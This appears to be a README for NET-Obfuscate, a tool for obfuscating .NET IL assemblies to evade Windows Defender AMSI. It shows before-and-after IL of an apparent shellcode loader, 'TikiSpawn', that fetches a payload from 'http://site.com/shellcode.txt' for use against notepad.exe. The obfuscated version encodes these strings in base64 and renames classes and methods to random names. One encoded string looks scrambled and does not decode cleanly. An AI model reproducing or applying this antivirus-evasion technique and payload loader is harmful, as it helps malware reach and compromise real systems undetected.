# NET-Obfuscate
Obfuscate ECMA CIL (.NET IL) assemblies to evade Windows Defender AMSI 

## TikiSpawn Example(IL):
* Before *
```
.class public auto ansi beforefieldinit TikiSpawn
	extends [mscorlib]System.Object
{
	.custom instance void [mscorlib]System.Runtime.InteropServices.ComVisibleAttribute::.ctor(bool) = (
		01 00 01 00 00
	)
	// Methods
	// Token: 0x06000002 RID: 2 RVA: 0x0000204F File Offset: 0x0000024F
	.method public hidebysig specialname rtspecialname 
		instance void .ctor () cil managed 
	{
		// Header Size: 1 byte
		// Code Size: 23 (0x17) bytes
		.maxstack 8

		/* (13,5)-(13,23) C:\Users\User\Source\Repos\TikiTorch\TikiSpawn\Program.cs */
		/* 0x00000250 02           */ IL_0000: ldarg.0
		/* 0x00000251 280100000A   */ IL_0001: call      instance void [mscorlib]System.Object::.ctor()
		/* (15,9)-(15,82) C:\Users\User\Source\Repos\TikiTorch\TikiSpawn\Program.cs */
		/* 0x00000256 02           */ IL_0006: ldarg.0
		/* 0x00000257 7201000070   */ IL_0007: ldstr     "c:\\windows\\notepad.exe"
		/* 0x0000025C 722F000070   */ IL_000C: ldstr     "http://site.com/shellcode.txt"
		/* 0x00000261 2806000006   */ IL_0011: call      instance void TikiSpawn::Flame(string, string)
		/* (16,5)-(16,6) C:\Users\User\Source\Repos\TikiTorch\TikiSpawn\Program.cs */
		/* 0x00000266 2A           */ IL_0016: ret
	} // end of method TikiSpawn::.ctor
```
* After *
```
.class public auto ansi beforefieldinit EVMR2Y8ZMC.JPEQYLSVTO
	extends [mscorlib]System.Object
{
	.custom instance void [mscorlib]System.Runtime.InteropServices.ComVisibleAttribute::.ctor(bool) = (
		01 00 01 00 00
	)
	// Methods
	// Token: 0x06000002 RID: 2 RVA: 0x0000204F File Offset: 0x0000024F
	.method public hidebysig specialname rtspecialname 
		instance void .ctor () cil managed 
	{
		// Header Size: 1 byte
		// Code Size: 55 (0x37) bytes
		.maxstack 8

		/* 0x00000250 02           */ IL_0000: ldarg.0
		/* 0x00000251 281000000A   */ IL_0001: call      instance void [mscorlib]System.Object::.ctor()
		/* 0x00000256 02           */ IL_0006: ldarg.0
		/* 0x00000257 00           */ IL_0007: nop
		/* 0x00000258 281100000A   */ IL_0008: call      class [mscorlib]System.Text.Encoding [mscorlib]System.Text.Encoding::get_UTF8()
		/* 0x0000025D 7201000070   */ IL_000D: ldstr     "Yzpcd2luZG93c1xub3RlcGFkLmV4ZQ=="
		/* 0x00000262 281200000A   */ IL_0012: call      uint8[] [mscorlib]System.Convert::FromBase64String(string)
		/* 0x00000267 6F1300000A   */ IL_0017: callvirt  instance string [mscorlib]System.Text.Encoding::GetString(uint8[])
		/* 0x0000026C 00           */ IL_001C: nop
		/* 0x0000026D 281100000A   */ IL_001D: call      class [mscorlib]System.Text.Encoding [mscorlib]System.Text.Encoding::get_UTF8()
		/* 0x00000272 7243000070   */ IL_0022: ldstr     "asRsdcDsdvsdzEsdi4xNjzuNzI5MTY2g3NoxsY2asdf9sdZsd50eHQ="
		/* 0x00000277 281200000A   */ IL_0027: call      uint8[] [mscorlib]System.Convert::FromBase64String(string)
		/* 0x0000027C 6F1300000A   */ IL_002C: callvirt  instance string [mscorlib]System.Text.Encoding::GetString(uint8[])
		/* 0x00000281 2806000006   */ IL_0031: call      instance void EVMR2Y8ZMC.JPEQYLSVTO::'40W6NX6Z4J'(string, string)
		/* 0x00000286 2A           */ IL_0036: ret
	} // end of method JPEQYLSVTO::.ctor
```1
